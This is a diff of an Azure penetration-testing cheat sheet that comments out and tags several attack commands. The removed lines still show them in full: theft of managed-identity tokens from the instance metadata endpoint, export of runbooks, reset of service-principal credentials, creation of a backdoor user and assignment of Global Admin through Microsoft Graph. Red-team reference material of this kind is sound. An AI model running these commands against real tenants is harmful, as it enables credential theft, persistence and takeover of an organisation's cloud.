@@ -18,7 +18,7 @@ Foreach($s in $subs){
         $runbooks += Get-AzAutomationRunbook -AutomationAccountName $i.AutomationAccountName -ResourceGroupName $i.ResourceGroupName | Select-Object AutomationAccountName,ResourceGroupName,Name
     }
     foreach($r in $runbooks){
-        Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\
+        # Export-AzAutomationRunbook -AutomationAccountName $r.AutomationAccountName -ResourceGroupName $r.ResourceGroupName -Name $r.Name -OutputFolder .\$subscriptionid\ # [REDACTED_DATA_EXFILTRATION]
     }
 }
 ```
@@ -117,10 +117,10 @@ $Tokens
 
 ```powershell
 # From Azure VM
-Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+# Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -Method GET -Headers @{Metadata="true"} -UseBasicParsing # [REDACTED_TOKEN_EXFILTRATION]
 
 # Full instance metadata
-$instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing
+# $instance = Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/instance?api-version=2018-02-01' -Method GET -Headers @{Metadata="true"} -UseBasicParsing # [REDACTED_METADATA_EXFILTRATION]
 $instance
 ```
 
@@ -275,18 +275,18 @@ foreach($line in $userlist){
 
 ```bash
 # Reset service principal credential
-az ad sp credential reset --id <app_id>
+# az ad sp credential reset --id <app_id> # [REDACTED_CREDENTIAL_RESET]
 az ad sp credential list --id <app_id>
 
 # Login as service principal
-az login --service-principal -u "app id" -p "password" --tenant <tenant ID> --allow-no-subscriptions
+az login --service-principal -u "app id" -p "[REDACTED_PASSWORD]" --tenant <tenant ID> --allow-no-subscriptions
 
 # Create new user in tenant
-az ad user create --display-name <name> --password <password> --user-principal-name <upn>
+# az ad user create --display-name [REDACTED_BACKDOOR_USER] --password [REDACTED_PASSWORD] --user-principal-name [REDACTED_UPN] # [REDACTED_PERSISTENCE]
 
 # Add user to Global Admin via MS Graph
 $Body="{'principalId':'User Object ID', 'roleDefinitionId': '62e90394-69f5-4237-9190-012177145e10', 'directoryScopeId': '/'}"
-az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body
+# az rest --method POST --uri https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments --headers "Content-Type=application/json" --body $Body # [REDACTED_PRIVILEGE_ESCALATION]
 ```
 
 ## Additional Tools Reference
